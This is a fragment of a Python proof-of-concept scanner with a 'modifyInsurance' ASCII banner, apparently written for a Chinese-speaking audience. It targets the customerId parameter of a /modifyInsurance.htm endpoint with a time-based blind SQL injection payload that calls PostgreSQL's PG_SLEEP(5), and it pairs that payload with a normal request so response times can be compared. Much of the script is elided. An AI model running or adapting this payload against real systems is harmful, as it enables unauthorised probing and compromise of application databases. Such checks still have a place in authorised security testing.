...
def banner():
    test = """
                     _ _  __        _____                                          
 _ __ ___   ___   __| (_)/ _|_   _  \_   \_ __  ___ _   _ _ __ __ _ _ __   ___ ___ 
| '_ ` _ \ / _ \ / _` | | |_| | | |  / /\/ '_ \/ __| | | | '__/ _` | '_ \ / __/ _ \
| | | | | | (_) | (_| | |  _| |_| /\/ /_ | | | \__ \ |_| | | | (_| | | | | (_|  __/
|_| |_| |_|\___/ \__,_|_|_|  \__, \____/ |_| |_|___/\__,_|_|  \__,_|_| |_|\___\___|
                             |___/                                                 """
    print(test)
...
def poc(target, output_file):
    ...
    # 定义payload
    payload_sleep = "/modifyInsurance.htm?documentCode=1&insuranceValue=1&customerId=1+AND+6269=(SELECT+6269+FROM+PG_SLEEP(5))"
    payload_normal = "/modifyInsurance.htm?documentCode=1&insuranceValue=1&customerId=1"
